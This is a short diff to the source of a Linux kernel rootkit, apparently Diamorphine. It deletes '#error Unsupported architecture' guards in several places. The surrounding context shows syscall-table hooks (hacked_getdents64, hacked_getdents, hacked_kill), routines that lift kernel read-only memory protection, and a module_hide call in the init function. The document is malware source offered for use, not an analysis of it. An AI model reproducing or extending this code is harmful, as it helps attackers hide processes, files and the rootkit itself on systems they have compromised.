@@ -39,7 +39,6 @@ unsigned long start_rodata;
 unsigned long init_begin;
 #define section_size    init_begin - start_rodata
 #else
-#error Unsupported architecture
 #endif
 static unsigned long *__sys_call_table;
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
@@ -114,7 +113,6 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
 		int fd = (int) pt_regs->regs[0];
         struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
 #else
-#error Unsupported architecture
 #endif
 	int ret = orig_getdents64(pt_regs), err;
 #else
@@ -182,7 +180,6 @@ static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
 		int fd = (int) pt_regs->regs[0];
         struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
 #else
-#error Unsupported architecture
 #endif
 	int ret = orig_getdents(pt_regs), err;
 #else
@@ -318,7 +315,6 @@ hacked_kill(const struct pt_regs *pt_regs)
         pid_t pid = (pid_t) pt_regs->regs[0];
         int sig = (int) pt_regs->regs[1];
 #else
-#error Unsupported architecture
 #endif
 #else
 asmlinkage int
@@ -376,7 +372,6 @@ protect_memory(void)
 			    section_size, PAGE_KERNEL_RO);
 
 #else
-#error Unsupported architecture
 #endif
 }
 
@@ -393,7 +388,6 @@ unprotect_memory(void)
     update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
 			    section_size, PAGE_KERNEL);
 #else
-#error Unsupported architecture
 #endif
 }
 
@@ -411,7 +405,6 @@ diamorphine_init(void)
     start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
     init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
 #else
-#error Unsupported architecture
 #endif
 
 	module_hide();
